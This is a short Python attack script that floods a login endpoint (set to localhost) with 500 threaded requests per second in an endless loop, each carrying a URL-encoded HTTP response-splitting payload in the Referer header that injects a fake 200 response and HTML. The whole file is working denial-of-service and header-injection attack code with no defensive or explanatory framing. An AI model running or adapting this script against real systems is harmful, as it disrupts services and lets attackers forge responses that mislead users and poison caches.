from threading import Thread
import requests
import time

target_url = "http://127.0.0.1:8000/login"
requests_per_second = 500

def send_request(target_url):
    try:
        encoded_payload = "http%3A%2F%2Flocalhost%2F%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%3B%20charset%3Dutf-8%0A%0A%3Chtml%3E%3Cbody%3E%3Ch1%3EHello%20World%21%3C%2Fh1%3E%3C%2Fbody%3E%3C%2Fhtml%3E"
        requests.get(target_url, headers={
            "Referer": encoded_payload
        })
    except requests.exceptions.ConnectionError:
        pass

while True:
    for i in range(requests_per_second):
        t = Thread(target=send_request, args=(target_url,))
        t.start()
        print("sending package....")
    time.sleep(1)